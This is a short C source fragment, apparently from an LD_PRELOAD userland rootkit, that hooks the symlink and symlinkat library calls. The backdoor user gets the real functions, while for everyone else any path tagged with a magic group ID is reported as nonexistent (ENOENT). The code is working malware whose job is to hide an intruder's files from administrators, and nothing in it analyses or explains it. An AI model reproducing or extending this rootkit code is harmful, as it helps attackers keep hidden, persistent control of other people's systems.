int symlink(const char *target, const char *linkpath)
{
    HOOK(o_symlink,CSYMLINK);
    if(is_bdusr()) return o_symlink(target, linkpath);
    if(hxstat(target,MGID,32) || hxstat(linkpath,MGID,32)){ errno=ENOENT; return -1; }
    return o_symlink(target, linkpath);
}

int symlinkat(const char *target, int newdirfd, const char *linkpath)
{
    HOOK(o_symlinkat, CSYMLINKAT);
    if(is_bdusr()) return o_symlinkat(target, newdirfd, linkpath);
    if(hxstat(target,MGID,32) || hfxstat(newdirfd,MGID,32) || hxstat(linkpath,MGID,32)){ errno=ENOENT; return -1; }
    return o_symlinkat(target, newdirfd, linkpath);
}
